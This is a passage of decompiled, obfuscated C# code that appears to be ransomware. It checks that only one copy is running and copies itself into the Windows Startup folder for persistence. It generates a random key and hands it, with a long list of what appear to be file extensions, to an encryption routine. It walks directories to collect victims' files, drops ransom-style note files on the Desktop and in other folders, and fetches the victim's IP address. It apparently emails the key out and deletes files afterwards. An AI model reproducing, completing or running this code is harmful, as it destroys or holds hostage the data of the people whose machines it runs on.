								{
									try
									{
										File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107389702) + ex12.Message + getString_0(107396347));
									}
									catch (Exception)
									{
									}
								}
								bPwGjuPFVSkSv++;
								return;
							}
						}
						if (ikJhDajEXzE)
						{
							if (oUtDEXanHATFjP != getString_0(107389748))
							{
								OUVgqzYMvbARRN(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, bytes2);
							}
							else
							{
								OUVgqzYMvbARRN(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a13;
			IL_0a13:
			maqAcdxAuaVA.Remove(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
		}

		static iathxhxZEnZYRxr()
		{
			Strings.CreateGetStringDelegate(typeof(iathxhxZEnZYRxr));
		}
	}

	private sealed class UGClOMhQSmdPCphv
	{
		public string bQDxaczCcCV;

		public string mrBqfZqsDLsHM;

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					File.Delete(bQDxaczCcCV);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__41()
		{
			while (true)
			{
				try
				{
					if (File.Exists(mrBqfZqsDLsHM))
					{
						File.Delete(mrBqfZqsDLsHM);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string JXDinipXjMGMMw;

	public static byte[] wYUomwviRA;

	public static string PRunLMYBEymXvZ;

	public static string MOwNEeKCkWc;

	public static List<string> tHRBvePvZt;

	public static List<string> eONykucyTofIr;

	public static string COkzouHlLwDk;

	public static string CmjdIJNPEyJFWZ;

	public static string OLMDYgZOvus;

	public static string dFOCMDUgzorRd;

	public static int yDFpRZhjAi;

	public static string iFejgjdImWjFLfEJ;

	public static string DqjdscWZwiTc;

	public static string WMLqmLfhTvVJrOb;

	public static string WSQgXkRrekaGs;

	public static string QDGeDzwDVgl;

	public static string UuftRUqrqAftPbDt;

	public static string IWWGiYWxwFPBJH;

	public static string UrfwCSOZXS;

	public static List<string> SkJpKqcowzj;

	public static List<string> wwtCrdNFpS;

	public static string SdALlPXZJEeU;

	public static string agpTqmGjHxk;

	public static string ZzpSUMuruEMq;

	public static List<string> dfsgzoHLEAZnW;

	public static string GbIwjWnxozPYW;

	private static string LzAuVVnnJnrbK;

	public static string HRBtCVbsJzEiv;

	public static string pRPqcVpYYp;

	public static List<string> LIbxVRdHLgwys;

	public static List<string> BEddlMgSRumsUTrFf;

	public static List<string> BZJTxwHhEd;

	public static List<string> cgbfpNpuwBlXCWz;

	public static string wjTMTqSnEKHyRP;

	public static List<string> ZrxFayVRUEpTPFWPR;

	public static List<string> KduFImCvDNCW;

	public static string okLnIxKDIHty;

	public static string VYJcXTyWUH;

	internal static DateTime CsgDlqabwJcb;

	internal static DateTime WgnjveiBZOpL;

	public static string TNpgrHCAoXmhjxRU;

	public static string qpeehHsICuPA;

	public static string STQyfqkWUJA;

	public static string DIQWpsTgKOevCy;

	public static string ZvtIboTbHzxJ;

	public static string WcZdJbPUVtdHb;

	public static string SuHWDGOfWjvSTEr;

	public static string UgGccBxJROB;

	public static List<string> sMhKmHJvtlNZhjZ;

	public static string nDWwTnbqwmod;

	public static string yzFHxOjAMjqD;

	public static string gzZfjuYSlfCdW;

	public static string CSCDqgbxncBKlCTT;

	public static string roDElfWBAaGjr;

	public static string pXJJrvzWZTOlJ;

	public static string VqQFMhrvhefguQa;

	public static string TJaGjniiyr;

	public static string FCCkXobqKKlsA;

	public static string NxixZamXUtL;

	public static string gdfkNPebMXlBthnv;

	public static string SWVGFmtCgOqI;

	public static string bDPzWxiCTcWUb;

	public static string FJnMkJLuWdeKj;

	public static string lpgKYQvRtQkb;

	public static string ansmXqPTWK;

	public static string HnFJfqQbTk;

	public static string WRcCHYfwJSEOt;

	public static string uBQXQHcitwPxXk;

	public static string KjHXSeuruGpT;

	public static string GddPzlyyTjLXDhDdd;

	public static string yPsILWAost;

	public static string HbTqvdTTXUG;

	public static string aTTwoHFMstld;

	public static string RjbbgSfRIRAObTU;

	public static string QpcWzRMIawakD;

	public static string DfyjWcAzblUboRK;

	public static string fgORneZzYmLlVXm;

	public static string zZGjrPMPTgZsL;

	public static string[] ZsBtSUCuwQsqK;

	public static string SphVOVZCYpOX;

	public static bool lfeuQUnLLY;

	public static string UjcOKiktKCME;

	public static bool ikJhDajEXzE;

	public static bool FqPnCZFnPZaSN;

	public static bool toZarvJmCliPIQ;

	public static bool YZBEffFadkYrR;

	public static string qiQAhhXEbdwvY;

	public static bool fvDSfFEVAaG;

	public static bool YkUeYWPguxEkk;

	public static bool ScAUDVMlbYwx;

	public static bool xYpnNhEseitt;

	public static bool XSErQnXGRX;

	public static string XxNdoOzVAqZ;

	public static bool DolWpTQIcvjTgATJ;

	public static Stopwatch PuViUghcLcP;

	public static int bPwGjuPFVSkSv;

	public static int DcpSoxMogYW;

	public static bool mNTCrJeXlKdoL;

	public static string bKhumNWWxHrd;

	public static string[] PXMIHCpxMDHksR;

	public static List<string> hRFiMNFGyIp;

	public static int QMoSPhxUXPCw;

	public static List<string> RuVXySfegGdfFir;

	public static List<string> KHtUXghIhDnYpIp;

	public static List<string> ijLlOEwtEyZv;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			hxFeLXKKdg CS_0024_003C_003E8__locals0 = new hxFeLXKKdg();
			CS_0024_003C_003E8__locals0.batkyOkXfMk = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.batkyOkXfMk) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			fvZGsqYIFBhe.KtVPTdSBGuby(LzAuVVnnJnrbK);
		}
		catch (Exception)
		{
		}
		try
		{
			if (QpcWzRMIawakD == getString_0(107396798))
			{
				Thread thread = new Thread(vWBSHzRuKrq.zcKtRRbByBky);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (WMLqmLfhTvVJrOb == getString_0(107396798))
		{
			Thread.Sleep(int.Parse(WSQgXkRrekaGs));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && SuHWDGOfWjvSTEr == getString_0(107396798))
		{
			try
			{
				oLOJfHAoqLns(QqgSuZNWThrmn(getString_0(107396793)));
			}
			catch
			{
			}
		}
		try
		{
			if (IWWGiYWxwFPBJH == getString_0(107396798) && dVhxaCURtN.xLetbAJvbvyOe())
			{
				new pvNHzBspAdKB().vdtyGwncmIcL(bool_0: false);
				dVhxaCURtN.XbIfKeEhamJA();
			}
		}
		catch (Exception)
		{
		}
		if (agpTqmGjHxk == getString_0(107396798) && dVhxaCURtN.xLetbAJvbvyOe())
		{
			new pvNHzBspAdKB().vdtyGwncmIcL(bool_0: false);
			new pvNHzBspAdKB().bjuNMFwwCYpCzk();
		}
		if (DqjdscWZwiTc == getString_0(107396798))
		{
			dHRoEtFamRW.uVvOQojhwcIVBG();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397232);
			string text2 = text + Path.GetFileName(fileName);
			if (dFOCMDUgzorRd == getString_0(107396798) && fileName != text2)
			{
				Thread thread2 = new Thread(UHtYyMotARxEH);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (COkzouHlLwDk == getString_0(107396798) && mainModule != null && fileName != text2)
			{
				try
				{
					yDFpRZhjAi = IPCsbtCzPorfNXo(0, SkJpKqcowzj.Count);
					File.Copy(fileName, text + SkJpKqcowzj[yDFpRZhjAi], overwrite: true);
					Process.Start(text + SkJpKqcowzj[yDFpRZhjAi]);
					JCyivAFPoKMiI();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (okLnIxKDIHty == getString_0(107396798) && DateTime.Now < CsgDlqabwJcb)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (VYJcXTyWUH == getString_0(107396798) && DateTime.Now > WgnjveiBZOpL)
			{
				JCyivAFPoKMiI();
			}
		}
		catch
		{
		}
		NSDiFEymnXxE();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> bEddlMgSRumsUTrFf = BEddlMgSRumsUTrFf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107389630)), string_0);
					};
				}
				Parallel.ForEach(bEddlMgSRumsUTrFf, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> bZJTxwHhEd = BZJTxwHhEd;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107389617)), string_0);
					};
				}
				Parallel.ForEach(bZJTxwHhEd, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (zZGjrPMPTgZsL == getString_0(107396798))
				{
					string[] zsBtSUCuwQsqK = ZsBtSUCuwQsqK;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107389617)), getString_0(107389592) + string_0 + getString_0(107389615));
						};
					}
					Parallel.ForEach(zsBtSUCuwQsqK, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!kdEHjiIxPH().Contains(getString_0(107390327)))
				{
					xCEwJwbanHmjooe(wjTMTqSnEKHyRP);
				}
				else
				{
					List<string> source = cgbfpNpuwBlXCWz;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							EYyCcfVgmmBPY(QqgSuZNWThrmn(TDHmCdnnGWV(getString_0(107389610))), string_0);
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> zrxFayVRUEpTPFWPR = ZrxFayVRUEpTPFWPR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107389553)), string_0);
					};
				}
				Parallel.ForEach(zrxFayVRUEpTPFWPR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397178)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !tHRBvePvZt.Contains(text6) && text6 != getString_0(107397189) && text6 != getString_0(107397168) && text6 != getString_0(107397115))
								{
									tHRBvePvZt.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397086)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397073))
						{
							bDPzWxiCTcWUb = getString_0(107396798);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397096))
						{
							bDPzWxiCTcWUb = getString_0(107397055);
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(qiQAhhXEbdwvY, getString_0(107397050) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (bDPzWxiCTcWUb == getString_0(107397055))
		{
			TKhtrQQiHbcFoqq();
		}
		if (bDPzWxiCTcWUb == getString_0(107396798))
		{
			try
			{
				NCczxXTQBGfnV();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && toZarvJmCliPIQ)
			{
				try
				{
					Thread thread4 = new Thread(NTDMoZZtMG.OZNelJrYAdqI);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EYyCcfVgmmBPY(getString_0(107397037), QqgSuZNWThrmn(getString_0(107396992)));
		}
		SecureString secureString = new SecureString();
		if (STQyfqkWUJA == getString_0(107397055))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			CmjdIJNPEyJFWZ = getString_0(107396407);
		}
		OLMDYgZOvus = qQVKYmLneEhR.HpWrTpHQoP(iBWhaZTDHfsDS(secureString));
		if (ScAUDVMlbYwx)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), XxNdoOzVAqZ)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), XxNdoOzVAqZ), string.Concat(QqgSuZNWThrmn(getString_0(107396394)), new WebClient().DownloadString(QqgSuZNWThrmn(getString_0(107396337))), getString_0(107396328), QqgSuZNWThrmn(getString_0(107396323)), DateTime.Now, getString_0(107396328), QqgSuZNWThrmn(getString_0(107396250)), OLMDYgZOvus));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), XxNdoOzVAqZ), getString_0(107396225) + OLMDYgZOvus);
				}
			}
			catch (Exception ex9)
			{
				if (fvDSfFEVAaG)
				{
					try
					{
						File.AppendAllText(qiQAhhXEbdwvY, getString_0(107396708) + ex9.Message + getString_0(107396328));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		tIVEwcxusvH.XpoVENafSyp(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), KjHXSeuruGpT), QswUgwGLjBGQYB(OLMDYgZOvus), null, null, getString_0(107396627), getString_0(107396642), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			gNuoxLUJuse();
		}
		try
		{
			try
			{
				if (DolWpTQIcvjTgATJ)
				{
					Console.WriteLine(getString_0(107396593));
				}
			}
			catch
			{
			}
			EYNETvUCNwXVP(new string[1] { getString_0(107396544) }, new string[100]
			{
				getString_0(107396535),
				getString_0(107396530),
				getString_0(107396557),
				getString_0(107396548),
				getString_0(107396511),
				getString_0(107396506),
				getString_0(107396501),
				getString_0(107396528),
				getString_0(107396523),
				getString_0(107396518),
				getString_0(107396513),
				getString_0(107396476),
				getString_0(107396467),
				getString_0(107396494),
				getString_0(107396485),
				getString_0(107395936),
				getString_0(107395931),
				getString_0(107395926),
				getString_0(107395921),
				getString_0(107395948),
				getString_0(107395939),
				getString_0(107395902),
				getString_0(107395897),
				getString_0(107395892),
				getString_0(107395919),
				getString_0(107395914),
				getString_0(107395909),
				getString_0(107395872),
				getString_0(107395867),
				getString_0(107395862),
				getString_0(107395857),
				getString_0(107395884),
				getString_0(107395879),
				getString_0(107395874),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107395855),
				getString_0(107395850),
				getString_0(107396501),
				getString_0(107395845),
				getString_0(107396523),
				getString_0(107395804),
				getString_0(107395799),
				getString_0(107395794),
				getString_0(107395821),
				getString_0(107395816),
				getString_0(107395811),
				getString_0(107395774),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395791),
				getString_0(107395786),
				getString_0(107395781),
				getString_0(107395744),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395729),
				getString_0(107395756),
				getString_0(107395747),
				getString_0(107395710),
				getString_0(107395701),
				getString_0(107395720),
				getString_0(107395845),
				getString_0(107396187),
				getString_0(107396178),
				getString_0(107396201),
				getString_0(107396160),
				getString_0(107396151),
				getString_0(107396174),
				getString_0(107396169),
				getString_0(107396128),
				getString_0(107396119),
				getString_0(107396142),
				getString_0(107396137),
				getString_0(107396132),
				getString_0(107396095),
				getString_0(107396090),
				getString_0(107396085),
				getString_0(107396112),
				getString_0(107396103),
				getString_0(107396098),
				getString_0(107396061),
				getString_0(107396056),
				getString_0(107396051),
				getString_0(107396078),
				getString_0(107396069),
				getString_0(107396028),
				getString_0(107396023),
				getString_0(107395879),
				getString_0(107396018),
				getString_0(107396045),
				getString_0(107396040),
				getString_0(107396035),
				getString_0(107395998),
				getString_0(107395989),
				getString_0(107396016),
				getString_0(107396011),
				getString_0(107396002),
				getString_0(107395965),
				getString_0(107395960)
			}, new string[0], iBWhaZTDHfsDS(secureString), getString_0(107395955));
		}
		catch (Exception ex11)
		{
			if (fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(qiQAhhXEbdwvY, getString_0(107395438) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381));
				streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107395356)));
				streamWriter.WriteLine(getString_0(107396328));
				streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107393370)));
				streamWriter.WriteLine(OLMDYgZOvus);
				if (HRBtCVbsJzEiv == getString_0(107397055))
				{
					streamWriter.WriteLine(getString_0(107396328));
					streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107393337)) + Convert.ToString(dfsgzoHLEAZnW.Count));
				}
				if (mNTCrJeXlKdoL)
				{
					streamWriter.WriteLine(getString_0(107396328));
					streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107393292)));
					streamWriter.WriteLine(WvzKEuHaCmnRFN.ZFtKFOgpGbKvcG());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381));
				if (!text8.Contains(OLMDYgZOvus) && !ikJhDajEXzE)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381), getString_0(107393259) + OLMDYgZOvus);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string wwtCrdNFp in wwtCrdNFpS)
		{
			num++;
			try
			{
				if (wwtCrdNFp == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(wwtCrdNFp + getString_0(107395381)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381), wwtCrdNFp + getString_0(107395381), overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381));
					if (!text9.Contains(OLMDYgZOvus) && !ikJhDajEXzE)
					{
						File.AppendAllText(wwtCrdNFp + getString_0(107395381), getString_0(107393259) + OLMDYgZOvus);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!YZBEffFadkYrR && num > 10)
			{
				break;
			}
		}
		if (HbTqvdTTXUG == getString_0(107396798))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393230)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393230));
					streamWriter2.WriteLine(QqgSuZNWThrmn(getString_0(107393173)));
					streamWriter2.WriteLine(getString_0(107396328));
					streamWriter2.WriteLine(QqgSuZNWThrmn(getString_0(107393188)));
					streamWriter2.WriteLine(OLMDYgZOvus + QqgSuZNWThrmn(getString_0(107393611)));
					if (HRBtCVbsJzEiv == getString_0(107397055))
					{
						streamWriter2.WriteLine(getString_0(107396328));
						streamWriter2.WriteLine(QqgSuZNWThrmn(getString_0(107393566)) + QqgSuZNWThrmn(getString_0(107393337)) + Convert.ToString(dfsgzoHLEAZnW.Count) + QqgSuZNWThrmn(getString_0(107393611)));
					}
					if (mNTCrJeXlKdoL)
					{
						streamWriter2.WriteLine(getString_0(107396328));
						streamWriter2.WriteLine(QqgSuZNWThrmn(getString_0(107393292)));
						streamWriter2.WriteLine(WvzKEuHaCmnRFN.ZFtKFOgpGbKvcG());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381));
					if (!text10.Contains(OLMDYgZOvus) && !ikJhDajEXzE)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393230), QqgSuZNWThrmn(getString_0(107393566)) + getString_0(107393259) + OLMDYgZOvus + QqgSuZNWThrmn(getString_0(107393611)));
					}
				}
			}
			catch
			{
			}
		}
		if (GbIwjWnxozPYW == getString_0(107396798))
		{
			try
			{
				if (HRBtCVbsJzEiv == getString_0(107397055))
				{
					WvzKEuHaCmnRFN.aSHjrEaEPzQjE(getString_0(107393537), getString_0(107393500), getString_0(107393519), string.Concat(QqgSuZNWThrmn(getString_0(107396394)), new WebClient().DownloadString(QqgSuZNWThrmn(getString_0(107396337))), getString_0(107393510), QqgSuZNWThrmn(getString_0(107396323)), DateTime.Now, getString_0(107396328), QqgSuZNWThrmn(getString_0(107393505)), Convert.ToString(dfsgzoHLEAZnW.Count), getString_0(107396328), QqgSuZNWThrmn(getString_0(107396250)), OLMDYgZOvus));
				}
				else
				{
					WvzKEuHaCmnRFN.aSHjrEaEPzQjE(getString_0(107393537), getString_0(107393500), getString_0(107393519), string.Concat(QqgSuZNWThrmn(getString_0(107396394)), new WebClient().DownloadString(QqgSuZNWThrmn(getString_0(107396337))), getString_0(107393510), QqgSuZNWThrmn(getString_0(107396323)), DateTime.Now, getString_0(107396328), QqgSuZNWThrmn(getString_0(107393505)), Convert.ToString(dfsgzoHLEAZnW.Count), getString_0(107396328), QqgSuZNWThrmn(getString_0(107396250)), OLMDYgZOvus));
				}
			}
			catch
			{
			}
		}
		if (UrfwCSOZXS == getString_0(107396798))
		{
			try
			{
				RGnFttxcGyX.eaJtMxeyFwKI(new Uri(getString_0(107393456)));
			}
			catch
			{
			}
		}
		if (HbTqvdTTXUG == getString_0(107397055))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381)))
				{
					Process.Start(QqgSuZNWThrmn(getString_0(107393455)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395381));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393230)))
				{
					Process.Start(QqgSuZNWThrmn(getString_0(107393398)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393230));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(pXJJrvzWZTOlJ))
		{
			try
			{
				File.Delete(pXJJrvzWZTOlJ);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(qiQAhhXEbdwvY, getString_0(107393413) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (fvDSfFEVAaG)
		{
			try
			{
				File.AppendAllText(qiQAhhXEbdwvY, getString_0(107392824));
			}
			catch (Exception)
			{
			}
		}
		if (JXDinipXjMGMMw == getString_0(107392843))
		{
			JCyivAFPoKMiI();
		}
	}

	public static void UHtYyMotARxEH()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(QqgSuZNWThrmn(getString_0(107392834)), QqgSuZNWThrmn(getString_0(107392680)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int IPCsbtCzPorfNXo(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> ZMVXiDPbvZjibg(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107392651)) && !text.Contains(getString_0(107393106)) && !text.Contains(getString_0(107393073)) && !text.ToLower().Contains(getString_0(107393056)) && !text.ToLower().Contains(getString_0(107393043)) && !text.Contains(getString_0(107393018)) && !text.Contains(getString_0(107393029)) && !text.ToLower().Contains(getString_0(107392984)) && !text.ToLower().Contains(getString_0(107393003)) && !text.ToLower().Contains(getString_0(107392966)) && !text.ToLower().Contains(getString_0(107392925)) && !text.ToLower().Contains(getString_0(107392940)) && !text.ToLower().Contains(getString_0(107392895)) && !text.ToLower().Contains(getString_0(107392882)) && !text.ToLower().Contains(getString_0(107392349)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392356)) && !fileInfo.FullName.Contains(getString_0(107392307)) && !fileInfo.FullName.Contains(getString_0(107392322)) && !fileInfo.FullName.Contains(getString_0(107392273)) && !fileInfo.FullName.Contains(getString_0(107392256)) && !fileInfo.FullName.Contains(getString_0(107392271)) && !fileInfo.FullName.Contains(getString_0(107392222)) && !fileInfo.FullName.Contains(getString_0(107392237)) && !fileInfo.FullName.Contains(getString_0(107392192)) && !fileInfo.FullName.Contains(getString_0(107392203)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392158)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392145)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392128)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392143)) && !fileInfo.FullName.Contains(QqgSuZNWThrmn(getString_0(107392606))) && !fileInfo.FullName.Contains(getString_0(107392613)) && !fileInfo.FullName.Contains(getString_0(107397227)) && !fileInfo.FullName.Contains(getString_0(107392568)) && !fileInfo.FullName.EndsWith(getString_0(107395955)) && !fileInfo.FullName.EndsWith(getString_0(107392583)) && !fileInfo.FullName.EndsWith(getString_0(107392578)) && !fileInfo.FullName.EndsWith(getString_0(107392541)) && !fileInfo.FullName.EndsWith(getString_0(107392536)) && !fileInfo.FullName.Contains(getString_0(107392531)) && !fileInfo.FullName.Contains(KjHXSeuruGpT) && !fileInfo.FullName.Contains(qiQAhhXEbdwvY) && !fileInfo.FullName.Contains(XxNdoOzVAqZ))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(MOwNEeKCkWc) * 1024.0 * 1024.0 && PRunLMYBEymXvZ == getString_0(107396798))
						{
							list.Add(fileInfo.FullName);
							ujZeWjRsRCpoZV(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && PRunLMYBEymXvZ == getString_0(107397055))
						{
							list.Add(fileInfo.FullName);
							ujZeWjRsRCpoZV(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void TKhtrQQiHbcFoqq()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
